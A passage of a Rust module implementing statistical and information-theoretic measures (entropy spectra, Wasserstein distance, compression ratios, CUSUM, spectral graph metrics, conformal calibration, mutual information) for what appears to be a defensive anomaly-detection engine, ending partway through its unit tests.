//!
//! ## Mathematical Toolkit
//!
//! 1. **Rényi Entropy Spectrum** — generalized entropy that captures different
//!    moments of the distribution; order α=2 (collision entropy) detects
//!    repeated patterns; α→∞ (min-entropy) detects deterministic components.
//!
//! 2. **Wasserstein-1 Distance** — optimal transport metric between distributions;
//!    metrically superior to KL-divergence (symmetric, satisfies triangle
//!    inequality, doesn't require absolute continuity).
//!
//! 3. **Normalized Compression Distance (NCD)** — Kolmogorov complexity proxy
//!    via deflate compression ratio; detects encrypted/packed/obfuscated payloads
//!    without knowing the specific algorithm.
//!
//! 4. **Page's CUSUM** — sequential change-point detector with optimal detection
//!    delay (Lorden's bound); detects the exact moment behavior shifts.
//!
//! 5. **Spectral Radius** — largest eigenvalue of process graph adjacency matrix;
//!    structural invariant that detects anomalous process tree topology.
//!
//! 6. **Conformal Prediction** — distribution-free coverage guarantee:
//!    P(Y ∈ C(X)) ≥ 1-α for exchangeable data.
//!
//! 7. **Mutual Information Rate** — bits of shared information per time unit
//!    between process event streams; detects C2 beaconing via periodic
//!    mutual dependence.

use std::collections::HashMap;

const EPS: f64 = 1e-15;

fn prob_stats(values: &[f64]) -> (f64, f64, usize) {
    let mut sum = 0.0;
    let mut max_p = 0.0;
    let mut support = 0usize;
    for &v in values {
        if v.is_finite() && v > 0.0 {
            sum += v;
            support += 1;
            if v > max_p {
                max_p = v;
            }
        }
    }
    (sum, max_p, support)
}

// ═══════════════════════════════════════════════════════════════════
// 1. RÉNYI ENTROPY SPECTRUM
// ═══════════════════════════════════════════════════════════════════

/// Rényi entropy of order α for a probability distribution.
///
/// H_α(P) = (1/(1-α)) · log₂(Σ pᵢ^α)
///
/// Special cases:
/// - α → 1: Shannon entropy H(P) = -Σ pᵢ log₂(pᵢ)
/// - α = 0: Hartley entropy log₂(|support|)
/// - α = 2: Collision entropy -log₂(Σ pᵢ²)  [detects repeated patterns]
/// - α → ∞: Min-entropy -log₂(max pᵢ)  [security metric: detects determinism]
pub fn renyi_entropy(probs: &[f64], alpha: f64) -> f64 {
    if probs.is_empty() {
        return 0.0;
    }
    if !alpha.is_finite() || alpha < 0.0 {
        return 0.0;
    }
    if (alpha - 1.0).abs() < 1e-12 {
        return shannon_entropy(probs);
    }
    let (sum, max_p, support) = prob_stats(probs);
    if alpha < 1e-12 {
        // Hartley entropy
        return (support.max(1) as f64).log2();
    }
    if alpha > 1e6 {
        // Min-entropy
        if sum <= 0.0 {
            return 0.0;
        }
        let max_pn = max_p / sum;
        return if max_pn > 0.0 { -max_pn.log2() } else { 0.0 };
    }
    if sum <= 0.0 {
        return 0.0;
    }
    let sum_p_alpha: f64 = probs
        .iter()
        .filter(|&&p| p > 0.0)
        .map(|&p| (p / sum).powf(alpha))
        .sum();
    if sum_p_alpha <= 0.0 {
        return 0.0;
    }
    (1.0 / (1.0 - alpha)) * sum_p_alpha.log2()
}

/// Shannon entropy (bits).
pub fn shannon_entropy(probs: &[f64]) -> f64 {
    let (sum, _, _) = prob_stats(probs);
    if sum <= 0.0 {
        return 0.0;
    }
    probs
        .iter()
        .filter(|&&p| p > 0.0)
        .map(|&p| {
            let pn = p / sum;
            -pn * pn.log2()
        })
        .sum()
}

/// Character-level Shannon entropy of a byte string.
pub fn char_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut freq = [0u64; 256];
    for &b in data {
        freq[b as usize] += 1;
    }
    let n = data.len() as f64;
    freq.iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

#[derive(Debug, Clone, Copy)]
pub struct CmdlineInfoMetrics {
    pub shannon_entropy_bits: f64,
    pub renyi_h2_bits: f64,
    pub min_entropy_bits: f64,
    pub entropy_gap_bits: f64,
    pub compression_ratio: f64,
}

#[derive(Debug, Clone, Copy)]
pub struct CmdlineInfoNormalized {
    pub renyi_h2: f64,
    pub compression_ratio: f64,
    pub min_entropy: f64,
    pub entropy_gap: f64,
}

impl CmdlineInfoMetrics {
    pub fn normalized(&self) -> CmdlineInfoNormalized {
        let renyi_h2 = (self.renyi_h2_bits / 8.0).clamp(0.0, 1.0);
        let min_entropy = (self.min_entropy_bits / 8.0).clamp(0.0, 1.0);
        let entropy_gap = 1.0 - (self.entropy_gap_bits / 4.0).clamp(0.0, 1.0);
        CmdlineInfoNormalized {
            renyi_h2,
            compression_ratio: self.compression_ratio.clamp(0.0, 1.0),
            min_entropy,
            entropy_gap,
        }
    }
}

pub fn cmdline_information(data: &[u8], min_len: usize) -> Option<CmdlineInfoMetrics> {
    if data.len() < min_len || data.is_empty() {
        return None;
    }
    let mut freq = [0u64; 256];
    for &b in data {
        freq[b as usize] += 1;
    }
    let n = data.len() as f64;
    let mut shannon = 0.0;
    let mut sum_p2 = 0.0;
    let mut max_p = 0.0;
    for &count in &freq {
        if count == 0 {
            continue;
        }
        let p = count as f64 / n;
        shannon += -p * p.log2();
        sum_p2 += p * p;
        if p > max_p {
            max_p = p;
        }
    }
    let renyi_h2 = if sum_p2 > 0.0 { -sum_p2.log2() } else { 0.0 };
    let min_entropy = if max_p > 0.0 { -max_p.log2() } else { 0.0 };
    let entropy_gap = (shannon - min_entropy).max(0.0);
    let comp = compression_ratio(data);
    Some(CmdlineInfoMetrics {
        shannon_entropy_bits: shannon,
        renyi_h2_bits: renyi_h2,
        min_entropy_bits: min_entropy,
        entropy_gap_bits: entropy_gap,
        compression_ratio: comp,
    })
}

/// Rényi entropy spectrum: compute H_α for multiple orders simultaneously.
/// Returns a vector of (α, H_α) pairs.
///
/// The *shape* of this spectrum is the signature:
/// - Uniform random data: flat spectrum near log₂(256) ≈ 8.0
/// - English text: decreasing from ~4.7 (H₀) to ~1.0 (H_∞)
/// - Packed malware: high H₁ (~7.9) but lower H_∞ due to headers
/// - Base64: H₁ ≈ 6.0, H₂ ≈ 5.9 (very flat — limited alphabet)
pub fn renyi_spectrum(data: &[u8]) -> Vec<(f64, f64)> {
    if data.is_empty() {
        return Vec::new();
    }
    let mut freq = [0u64; 256];
    for &b in data {
        freq[b as usize] += 1;
    }
    let n = data.len() as f64;
    let probs: Vec<f64> = freq
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| c as f64 / n)
        .collect();

    let orders = [0.0, 0.5, 1.0, 2.0, 3.0, 5.0, 10.0, f64::INFINITY];
    orders
        .iter()
        .map(|&alpha| {
            let h = if alpha == f64::INFINITY {
                let (_, max_p, _) = prob_stats(&probs);
                if max_p > 0.0 { -max_p.log2() } else { 0.0 }
            } else {
                renyi_entropy(&probs, alpha)
            };
            (alpha, h)
        })
        .collect()
}

/// Rényi divergence D_α(P || Q) — generalization of KL-divergence.
///
/// D_α(P || Q) = (1/(α-1)) · log₂(Σ pᵢ^α · qᵢ^(1-α))
///
/// For α→1 this converges to KL-divergence.
/// For α=2 this gives the χ²-divergence (more sensitive to rare events).
pub fn renyi_divergence(p: &[f64], q: &[f64], alpha: f64) -> f64 {
    assert_eq!(p.len(), q.len());
    if p.is_empty() {
        return 0.0;
    }
    if !alpha.is_finite() || alpha < 0.0 {
        return 0.0;
    }
    if (alpha - 1.0).abs() < 1e-12 {
        return kl_divergence(p, q);
    }
    let (sum_p, _, _) = prob_stats(p);
    let (sum_q, _, _) = prob_stats(q);
    if sum_p <= 0.0 || sum_q <= 0.0 {
        return 0.0;
    }
    let sum: f64 = p
        .iter()
        .zip(q.iter())
        .filter(|(&pi, _)| pi > 0.0)
        .map(|(&pi, &qi)| {
            let pn = pi / sum_p;
            let qn = (qi / sum_q).max(EPS);
            pn.powf(alpha) * qn.powf(1.0 - alpha)
        })
        .sum();
    if sum <= 0.0 {
        return f64::INFINITY;
    }
    (1.0 / (alpha - 1.0)) * sum.log2()
}

/// KL-divergence D_KL(P || Q) in bits.
pub fn kl_divergence(p: &[f64], q: &[f64]) -> f64 {
    assert_eq!(p.len(), q.len());
    if p.is_empty() {
        return 0.0;
    }
    let (sum_p, _, _) = prob_stats(p);
    let (sum_q, _, _) = prob_stats(q);
    if sum_p <= 0.0 || sum_q <= 0.0 {
        return 0.0;
    }
    p.iter()
        .zip(q.iter())
        .filter(|(&pi, _)| pi > 0.0)
        .map(|(&pi, &qi)| {
            let pn = pi / sum_p;
            let qn = (qi / sum_q).max(EPS);
            pn * (pn / qn).log2()
        })
        .sum()
}

// ═══════════════════════════════════════════════════════════════════
// 2. WASSERSTEIN-1 DISTANCE (Earth Mover's Distance)
// ═══════════════════════════════════════════════════════════════════

/// Wasserstein-1 distance between two discrete distributions on an ordered domain.
///
/// W₁(P, Q) = Σᵢ |F_P(i) - F_Q(i)|
///
/// where F is the cumulative distribution function.
///
/// Properties (superior to KL-divergence):
/// - Symmetric: W₁(P,Q) = W₁(Q,P)
/// - Triangle inequality: W₁(P,R) ≤ W₁(P,Q) + W₁(Q,R)
/// - Defined even when supports don't overlap
/// - Metrizes weak convergence
pub fn wasserstein_1(p: &[f64], q: &[f64]) -> f64 {
    assert_eq!(p.len(), q.len());
    if p.is_empty() {
        return 0.0;
    }
    let (sum_p, _, _) = prob_stats(p);
    let (sum_q, _, _) = prob_stats(q);
    if sum_p <= 0.0 || sum_q <= 0.0 {
        return 0.0;
    }
    let mut cdf_p = 0.0;
    let mut cdf_q = 0.0;
    let mut distance = 0.0;
    for (&pi, &qi) in p.iter().zip(q.iter()) {
        cdf_p += pi / sum_p;
        cdf_q += qi / sum_q;
        distance += (cdf_p - cdf_q).abs();
    }
    distance
}

// ═══════════════════════════════════════════════════════════════════
// 3. NORMALIZED COMPRESSION DISTANCE (Kolmogorov Complexity Proxy)
// ═══════════════════════════════════════════════════════════════════

/// Compression ratio as a proxy for Kolmogorov complexity.
///
/// K(x) is uncomputable, but C(x)/|x| (compression ratio) is a
/// computable upper bound that's tight in practice.
///
/// - Random data: ratio ≈ 1.0 (incompressible)
/// - Structured data: ratio < 0.5
/// - Encrypted/packed malware: ratio ≈ 0.95-1.0 (high entropy)
/// - Base64-encoded: ratio ≈ 0.7-0.8
///
/// Uses a fast LZ77-style compression estimate (no allocations for large data).
pub fn compression_ratio(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let compressed_size = lz77_estimate(data);
    (compressed_size as f64 / data.len() as f64).clamp(0.0, 1.0)
}

/// Normalized Compression Distance between two byte sequences.
///
/// NCD(x, y) = (C(xy) - min(C(x), C(y))) / max(C(x), C(y))
///
/// NCD ∈ [0, 1+ε]: 0 = identical information content, 1 = maximally different.
/// This is a universal similarity metric (Li et al., 2004).
pub fn normalized_compression_distance(x: &[u8], y: &[u8]) -> f64 {
    if x.is_empty() && y.is_empty() {
        return 0.0;
    }
    let cx = lz77_estimate(x) as f64;
    let cy = lz77_estimate(y) as f64;
    let mut xy = Vec::with_capacity(x.len() + y.len());
    xy.extend_from_slice(x);
    xy.extend_from_slice(y);
    let cxy = lz77_estimate(&xy) as f64;
    let min_c = cx.min(cy);
    let max_c = cx.max(cy);
    if max_c < 1.0 {
        return 0.0;
    }
    ((cxy - min_c) / max_c).clamp(0.0, 1.5)
}

/// Fast LZ77-style compression size estimate.
/// Scans for longest backward matches within a sliding window.
/// Returns estimated compressed size in bytes.
fn lz77_estimate(data: &[u8]) -> usize {
    if data.is_empty() {
        return 0;
    }
    const WINDOW: usize = 256;
    let mut output_bits: usize = 0;
    let mut i = 0;
    while i < data.len() {
        let window_start = i.saturating_sub(WINDOW);
        let mut best_len = 0usize;
        // Search for longest match in window
        for j in window_start..i {
            let mut len = 0;
            while i + len < data.len()
                && len < 255
                && data[j + len % (i - j).max(1)] == data[i + len]
            {
                len += 1;
            }
            if len > best_len {
                best_len = len;
            }
        }
        if best_len >= 3 {
            // Match: distance(8 bits) + length(8 bits) + flag(1 bit)
            output_bits += 17;
            i += best_len;
        } else {
            // Literal: byte(8 bits) + flag(1 bit)
            output_bits += 9;
            i += 1;
        }
    }
    (output_bits + 7) / 8
}

// ═══════════════════════════════════════════════════════════════════
// 4. PAGE'S CUSUM — Sequential Change-Point Detection
// ═══════════════════════════════════════════════════════════════════

/// Page's CUSUM (Cumulative Sum) change-point detector.
///
/// Optimal detection delay by Lorden's theorem:
///   E[detection delay] ≤ (h / D_KL(P₁ || P₀)) · (1 + o(1))
///
/// where h is the threshold and D_KL is the KL-divergence between
/// the pre-change (P₀) and post-change (P₁) distributions.
///
/// The CUSUM statistic:
///   S_n = max(0, S_{n-1} + log(p₁(x_n) / p₀(x_n)))
///
/// Alarm when S_n > h.
#[derive(Debug, Clone)]
pub struct CusumDetector {
    /// Current CUSUM statistic.
    pub statistic: f64,
    /// Alarm threshold.
    pub threshold: f64,
    /// Reference (pre-change) mean.
    pub mu_0: f64,
    /// Allowance parameter (minimum shift to detect).
    pub allowance: f64,
    /// Number of observations.
    pub n: u64,
    /// Number of alarms.
    pub alarms: u64,
}

impl CusumDetector {
    /// Create a new CUSUM detector.
    ///
    /// - `mu_0`: expected mean under normal conditions
    /// - `allowance`: minimum shift to detect (k = δ/2 for optimal detection of shift δ)
    /// - `threshold`: alarm threshold h (controls FP rate: ARL₀ ≈ exp(2h²/σ²))
    pub fn new(mu_0: f64, allowance: f64, threshold: f64) -> Self {
        Self {
            statistic: 0.0,
            threshold,
            mu_0,
            allowance,
            n: 0,
            alarms: 0,
        }
    }

    /// Observe a new value. Returns true if change detected.
    pub fn observe(&mut self, x: f64) -> bool {
        self.n += 1;
        // One-sided upper CUSUM: detects increase
        self.statistic = (self.statistic + (x - self.mu_0) - self.allowance).max(0.0);
        if self.statistic > self.threshold {
            self.alarms += 1;
            self.statistic = 0.0; // reset after alarm
            true
        } else {
            false
        }
    }

    /// Average Run Length to false alarm (analytical approximation).
    /// ARL₀ ≈ exp(2·h·(h/σ² + allowance/σ²))
    /// For unit variance, this simplifies.
    pub fn estimated_arl0(&self) -> f64 {
        // Siegmund's approximation for unit variance
        let h = self.threshold;
        let k = self.allowance;
        if k <= 0.0 {
            return f64::INFINITY;
        }
        (h / k).exp() * (1.0 + k * h)
    }
}

/// Two-sided CUSUM: detects both increases and decreases.
#[derive(Debug, Clone)]
pub struct TwoSidedCusum {
    pub upper: CusumDetector,
    pub lower: CusumDetector,
}

impl TwoSidedCusum {
    pub fn new(mu_0: f64, allowance: f64, threshold: f64) -> Self {
        Self {
            upper: CusumDetector::new(mu_0, allowance, threshold),
            lower: CusumDetector::new(-mu_0, allowance, threshold),
        }
    }

    pub fn observe(&mut self, x: f64) -> bool {
        let upper_alarm = self.upper.observe(x);
        let lower_alarm = self.lower.observe(-x);
        upper_alarm || lower_alarm
    }
}

// ═══════════════════════════════════════════════════════════════════
// 5. SPECTRAL GRAPH ANALYSIS
// ═══════════════════════════════════════════════════════════════════

/// Spectral radius of an adjacency matrix (power iteration method).
///
/// The spectral radius ρ(A) = max|λᵢ| is a structural invariant:
/// - Normal process trees: ρ ≈ √(branching factor)
/// - Attack process trees: higher ρ (more interconnections)
/// - Fork bombs: ρ → ∞ rapidly
///
/// Cheeger's inequality relates ρ to graph expansion, giving
/// a principled anomaly threshold.
pub fn spectral_radius(adjacency: &[Vec<f64>]) -> f64 {
    let n = adjacency.len();
    if n == 0 {
        return 0.0;
    }
    // Power iteration: converges to dominant eigenvalue
    let mut v = vec![1.0 / (n as f64).sqrt(); n];
    let mut eigenvalue = 0.0;
    for _ in 0..50 {
        // Matrix-vector multiply
        let mut w = vec![0.0; n];
        for i in 0..n {
            for j in 0..n {
                w[i] += adjacency[i][j] * v[j];
            }
        }
        // Compute norm
        let norm: f64 = w.iter().map(|x| x * x).sum::<f64>().sqrt();
        if norm < 1e-15 {
            return 0.0;
        }
        eigenvalue = norm;
        // Normalize
        for x in &mut w {
            *x /= norm;
        }
        // Check convergence
        let diff: f64 = v
            .iter()
            .zip(w.iter())
            .map(|(a, b)| (a - b).powi(2))
            .sum::<f64>()
            .sqrt();
        v = w;
        if diff < 1e-10 {
            break;
        }
    }
    eigenvalue
}

/// Algebraic connectivity (Fiedler value): second-smallest eigenvalue of Laplacian.
///
/// λ₂ > 0 iff graph is connected. Low λ₂ means the graph is "almost disconnected"
/// — a structural signature of lateral movement (attacker bridging network segments).
pub fn algebraic_connectivity(adjacency: &[Vec<f64>]) -> f64 {
    let n = adjacency.len();
    if n <= 1 {
        return 0.0;
    }
    // Build Laplacian: L = D - A
    let mut laplacian = vec![vec![0.0; n]; n];
    for i in 0..n {
        let degree: f64 = adjacency[i].iter().sum();
        laplacian[i][i] = degree;
        for j in 0..n {
            laplacian[i][j] -= adjacency[i][j];
        }
    }
    // Find second-smallest eigenvalue via inverse power iteration
    // with deflation of the constant eigenvector (1/√n, ..., 1/√n).
    fiedler_value(&laplacian)
}

fn fiedler_value(laplacian: &[Vec<f64>]) -> f64 {
    let n = laplacian.len();
    // Shift to make positive definite: L' = L + (1/n)·11ᵀ
    // This maps the zero eigenvalue to 1 while preserving all others.
    let shift = 1.0 / n as f64;
    let mut shifted = laplacian.to_vec();
    for i in 0..n {
        for j in 0..n {
            shifted[i][j] += shift;
        }
    }
    // Inverse power iteration on shifted matrix finds smallest eigenvalue of L'
    // which corresponds to second-smallest of L (since we shifted the zero).
    let mut v = vec![0.0; n];
    // Start with vector orthogonal to constant vector
    for i in 0..n {
        v[i] = if i % 2 == 0 { 1.0 } else { -1.0 };
    }
    let norm: f64 = v.iter().map(|x| x * x).sum::<f64>().sqrt();
    for x in &mut v {
        *x /= norm;
    }

    let mut lambda = 0.0;
    for _ in 0..100 {
        // Solve shifted · w = v (using Jacobi iteration for simplicity)
        let w = jacobi_solve(&shifted, &v, 50);
        // Project out constant eigenvector
        let mean: f64 = w.iter().sum::<f64>() / n as f64;
        let mut w_proj: Vec<f64> = w.iter().map(|x| x - mean).collect();
        let norm: f64 = w_proj.iter().map(|x| x * x).sum::<f64>().sqrt();
        if norm < 1e-15 {
            return 0.0;
        }
        for x in &mut w_proj {
            *x /= norm;
        }
        // Rayleigh quotient
        let mut num = 0.0;
        for i in 0..n {
            for j in 0..n {
                num += w_proj[i] * laplacian[i][j] * w_proj[j];
            }
        }
        lambda = num;
        let diff: f64 = v
            .iter()
            .zip(w_proj.iter())
            .map(|(a, b)| (a - b).powi(2))
            .sum::<f64>()
            .sqrt();
        v = w_proj;
        if diff < 1e-10 {
            break;
        }
    }
    lambda.max(0.0)
}

fn jacobi_solve(a: &[Vec<f64>], b: &[f64], iterations: usize) -> Vec<f64> {
    let n = a.len();
    let mut x = b.to_vec();
    let mut x_new = vec![0.0; n];
    for _ in 0..iterations {
        for i in 0..n {
            let mut sum = b[i];
            for j in 0..n {
                if j != i {
                    sum -= a[i][j] * x[j];
                }
            }
            x_new[i] = if a[i][i].abs() > 1e-15 {
                sum / a[i][i]
            } else {
                0.0
            };
        }
        std::mem::swap(&mut x, &mut x_new);
    }
    x
}

// ═══════════════════════════════════════════════════════════════════
// 6. CONFORMAL PREDICTION — Distribution-Free Coverage Guarantee
// ═══════════════════════════════════════════════════════════════════

/// Conformal prediction wrapper for ML scores.
///
/// **Theorem (Vovk et al., 2005)**: For exchangeable data (X₁,Y₁),...,(Xₙ,Yₙ),
/// the conformal prediction set C_α(X_{n+1}) satisfies:
///
///   P(Y_{n+1} ∈ C_α(X_{n+1})) ≥ 1 - α
///
/// regardless of the underlying distribution. This is a **finite-sample**
/// guarantee — no asymptotic assumptions.
///
/// We use it to calibrate the ML score threshold so that the declared
/// false-positive rate is mathematically guaranteed, not just empirical.
#[derive(Debug, Clone)]
pub struct ConformalCalibrator {
    /// Sorted nonconformity scores from calibration set.
    scores: Vec<f64>,
    /// Desired miscoverage rate (e.g., 0.01 for 99% coverage).
    alpha: f64,
    /// Calibrated threshold (computed from quantile).
    pub threshold: f64,
}

impl ConformalCalibrator {
    /// Create calibrator from a set of nonconformity scores (higher = more anomalous).
    ///
    /// The threshold is set to the ⌈(1-α)(n+1)⌉/n quantile of the scores,
    /// which guarantees P(score > threshold) ≤ α for exchangeable future data.
    pub fn new(mut calibration_scores: Vec<f64>, alpha: f64) -> Self {
        calibration_scores.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
        let n = calibration_scores.len();
        let threshold = if n == 0 {
            f64::INFINITY
        } else {
            let quantile_idx = (((1.0 - alpha) * (n as f64 + 1.0)).ceil() as usize)
                .min(n)
                .saturating_sub(1);
            calibration_scores[quantile_idx]
        };
        Self {
            scores: calibration_scores,
            alpha,
            threshold,
        }
    }

    /// Test whether a new score is anomalous with guaranteed FP rate ≤ α.
    pub fn is_anomalous(&self, score: f64) -> bool {
        score > self.threshold
    }

    /// Compute the p-value for a new score.
    /// p = |{i : s_i ≥ score}| / (n + 1)
    pub fn p_value(&self, score: f64) -> f64 {
        let n = self.scores.len();
        if n == 0 {
            return 1.0;
        }
        let count_geq = self.scores.iter().filter(|&&s| s >= score).count();
        (count_geq as f64 + 1.0) / (n as f64 + 1.0)
    }

    /// Guaranteed coverage probability: 1 - α.
    pub fn coverage_guarantee(&self) -> f64 {
        1.0 - self.alpha
    }

    /// Number of calibration samples.
    pub fn calibration_size(&self) -> usize {
        self.scores.len()
    }
}

// ═══════════════════════════════════════════════════════════════════
// 7. MUTUAL INFORMATION RATE — C2 Beaconing Detection
// ═══════════════════════════════════════════════════════════════════

/// Estimate mutual information between two discrete time series.
///
/// I(X;Y) = Σ_{x,y} p(x,y) · log₂(p(x,y) / (p(x)·p(y)))
///
/// For C2 beaconing detection: X = inter-arrival times (quantized),
/// Y = packet sizes (quantized). High MI means periodic pattern.
pub fn mutual_information(x: &[u32], y: &[u32]) -> f64 {
    assert_eq!(x.len(), y.len());
    let n = x.len();
    if n == 0 {
        return 0.0;
    }

    let mut joint: HashMap<(u32, u32), usize> = HashMap::new();
    let mut marginal_x: HashMap<u32, usize> = HashMap::new();
    let mut marginal_y: HashMap<u32, usize> = HashMap::new();

    for (&xi, &yi) in x.iter().zip(y.iter()) {
        *joint.entry((xi, yi)).or_insert(0) += 1;
        *marginal_x.entry(xi).or_insert(0) += 1;
        *marginal_y.entry(yi).or_insert(0) += 1;
    }

    let nf = n as f64;
    let mut mi = 0.0;
    for (&(xi, yi), &count) in &joint {
        let pxy = count as f64 / nf;
        let px = marginal_x[&xi] as f64 / nf;
        let py = marginal_y[&yi] as f64 / nf;
        if pxy > 0.0 && px > 0.0 && py > 0.0 {
            mi += pxy * (pxy / (px * py)).log2();
        }
    }
    mi
}

/// Shannon entropy of a lowercase domain label distribution.
///
/// Normalized by log2(36) (a-z, 0-9) to yield [0,1].
pub fn dns_entropy(domain: &str) -> f64 {
    let label = domain
        .split('.')
        .find(|s| !s.is_empty())
        .unwrap_or("")
        .to_ascii_lowercase();
    if label.is_empty() {
        return 0.0;
    }

    let mut counts = [0u64; 36];
    let mut total = 0u64;
    for b in label.as_bytes() {
        let idx = match *b {
            b'a'..=b'z' => Some((b - b'a') as usize),
            b'0'..=b'9' => Some(26 + (b - b'0') as usize),
            _ => None,
        };
        if let Some(i) = idx {
            counts[i] += 1;
            total += 1;
        }
    }
    if total == 0 {
        return 0.0;
    }

    let total_f = total as f64;
    let mut entropy = 0.0;
    for count in counts {
        if count == 0 {
            continue;
        }
        let p = count as f64 / total_f;
        entropy += -p * p.log2();
    }
    let max = (36.0_f64).log2();
    (entropy / max).clamp(0.0, 1.0)
}

// ═══════════════════════════════════════════════════════════════════
// 8. CONCENTRATION INEQUALITIES — Provable FP Rate Bounds
// ═══════════════════════════════════════════════════════════════════

/// Hoeffding's inequality bound on tail probability.
///
/// For n iid observations in [a,b]:
///   P(|X̄ - μ| ≥ t) ≤ 2·exp(-2n·t² / (b-a)²)
///
/// Inverted to get threshold for desired FP rate δ:
///   t = (b-a) · √(ln(2/δ) / (2n))
pub fn hoeffding_threshold(n: usize, range: f64, delta: f64) -> f64 {
    if n == 0 || delta <= 0.0 {
        return f64::INFINITY;
    }
    range * ((2.0_f64 / delta).ln() / (2.0 * n as f64)).sqrt()
}

/// Bernstein's inequality — tighter than Hoeffding when variance is small.
///
/// P(|X̄ - μ| ≥ t) ≤ 2·exp(-n·t² / (2σ² + 2bt/3))
///
/// where b is the max absolute value and σ² is the variance.
pub fn bernstein_threshold(n: usize, variance: f64, bound: f64, delta: f64) -> f64 {
    if n == 0 || delta <= 0.0 {
        return f64::INFINITY;
    }
    if variance < 0.0 || bound <= 0.0 {
        return f64::INFINITY;
    }
    let ln_term = (2.0 / delta).ln();
    let nf = n as f64;
    // Solve quadratic: t² / (2σ²) - t·b/(3) = ln_term/n ... approximate
    // Use upper bound: t ≤ √(2σ²·ln(2/δ)/n) + b·ln(2/δ)/(3n)
    (2.0 * variance * ln_term / nf).sqrt() + bound * ln_term / (3.0 * nf)
}

/// McDiarmid's inequality for bounded-difference functions.
///
/// If f(x₁,...,xₙ) satisfies |f(x) - f(x')| ≤ cᵢ when xᵢ ≠ x'ᵢ, then:
///   P(f - E[f] ≥ t) ≤ exp(-2t² / Σcᵢ²)
///
/// Returns threshold t for desired FP rate δ.
pub fn mcdiarmid_threshold(bounded_differences: &[f64], delta: f64) -> f64 {
    if bounded_differences.is_empty() || delta <= 0.0 {
        return f64::INFINITY;
    }
    let sum_sq: f64 = bounded_differences.iter().map(|c| c * c).sum();
    if sum_sq <= 0.0 {
        return 0.0;
    }
    (sum_sq * (1.0 / delta).ln() / 2.0).sqrt()
}

/// Sanov's theorem bound — probability of observing empirical distribution
/// P̂ when true distribution is Q.
///
/// P(P̂ ∈ E) ≤ (n+1)^k · 2^(-n · D_KL(P* || Q))
///
/// where P* is the information projection onto set E, and k = |alphabet|.
///
/// Inverted: for FP rate δ and window n with k categories,
///   τ = (k·log₂(n+1) + log₂(1/δ)) / n
pub fn sanov_threshold(n: usize, k: usize, delta: f64) -> f64 {
    if n == 0 || k == 0 || delta <= 0.0 {
        return f64::INFINITY;
    }
    let nf = n as f64;
    let kf = k as f64;
    (kf * (nf + 1.0).log2() + (1.0 / delta).log2()) / nf
}

// ═══════════════════════════════════════════════════════════════════
// TESTS
// ═══════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    #[test]
    fn shannon_entropy_uniform() {
        // 256 equiprobable outcomes → H = 8 bits
        let probs: Vec<f64> = vec![1.0 / 256.0; 256];
        let h = shannon_entropy(&probs);
        assert!((h - 8.0).abs() < 1e-10, "H = {h}");
    }

    #[test]
    fn shannon_entropy_deterministic() {
        let probs = vec![1.0, 0.0, 0.0];
        assert!((shannon_entropy(&probs)).abs() < 1e-10);
    }

    #[test]
    fn shannon_entropy_scales_invariant() {
        let probs = vec![2.0, 1.0, 1.0];
        let h = shannon_entropy(&probs);
        let h_norm = shannon_entropy(&[0.5, 0.25, 0.25]);
        assert!((h - h_norm).abs() < 1e-10, "scaled entropy mismatch: {h} vs {h_norm}");
    }

    #[test]
    fn renyi_spectrum_random_data() {
        let data: Vec<u8> = (0..1000).map(|i| (i * 97 + 13) as u8).collect();
        let spectrum = renyi_spectrum(&data);
        // All orders should be close for near-uniform data
        for &(_, h) in &spectrum {
            assert!(h > 5.0, "random data entropy should be high: {h}");
        }
    }

    #[test]
    fn renyi_spectrum_base64_like() {
        // Base64 uses ~64 characters out of 256
        let data: Vec<u8> = (0..500).map(|i| b'A' + (i % 52) as u8).collect();
        let spectrum = renyi_spectrum(&data);
        let h1 = spectrum
            .iter()
            .find(|(a, _)| (*a - 1.0).abs() < 0.01)
            .unwrap()
            .1;
        assert!(h1 < 7.0 && h1 > 4.0, "base64-like H₁ should be ~5-6: {h1}");
    }

    #[test]
    fn wasserstein_identical() {
        let p = vec![0.25, 0.25, 0.25, 0.25];
        assert!((wasserstein_1(&p, &p)).abs() < 1e-15);
    }

    #[test]
    fn wasserstein_scales_invariant() {
        let p = vec![2.0, 1.0, 1.0];
        let q = vec![1.0, 2.0, 1.0];
        let w = wasserstein_1(&p, &q);
        let wn = wasserstein_1(&[0.5, 0.25, 0.25], &[0.25, 0.5, 0.25]);
        assert!((w - wn).abs() < 1e-10, "scaled wasserstein mismatch: {w} vs {wn}");
    }

    #[test]
    fn wasserstein_extreme_shift() {
        let p = vec![1.0, 0.0, 0.0, 0.0];
        let q = vec![0.0, 0.0, 0.0, 1.0];
        let w = wasserstein_1(&p, &q);
        assert!(w > 2.0, "extreme shift should have large W₁: {w}");
    }

    #[test]
    fn wasserstein_triangle_inequality() {
        let p = vec![0.5, 0.3, 0.2];
        let q = vec![0.1, 0.3, 0.6];
        let r = vec![0.3, 0.4, 0.3];
        let w_pr = wasserstein_1(&p, &r);
        let w_pq = wasserstein_1(&p, &q);
        let w_qr = wasserstein_1(&q, &r);
        assert!(w_pr <= w_pq + w_qr + 1e-10, "triangle inequality violated");
    }

    #[test]
    fn compression_ratio_high_entropy_is_high() {
        // Use a better pseudo-random generator (xorshift) for high-entropy data
        let mut x: u64 = 0xDEADBEEF_CAFEBABE;
        let data: Vec<u8> = (0..500)
            .map(|_| {
                x ^= x << 13;
                x ^= x >> 7;
                x ^= x << 17;
                (x & 0xFF) as u8
            })
            .collect();
        let ratio = compression_ratio(&data);
        assert!(
            ratio > 0.5,
            "high-entropy data ratio should be high: {ratio}"
        );
    }

    #[test]
    fn compression_ratio_repetitive_is_low() {
        let data = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".to_vec();
        let ratio = compression_ratio(&data);
        assert!(ratio < 0.5, "repetitive data ratio should be low: {ratio}");
    }

    #[test]
    fn cusum_detects_shift() {
        let mut detector = CusumDetector::new(0.0, 0.5, 5.0);
        // Normal phase
        for _ in 0..50 {
            assert!(!detector.observe(0.1));
        }
        // Shift phase (mean jumps to 3.0)
        let mut detected = false;
        for _ in 0..20 {
            if detector.observe(3.0) {
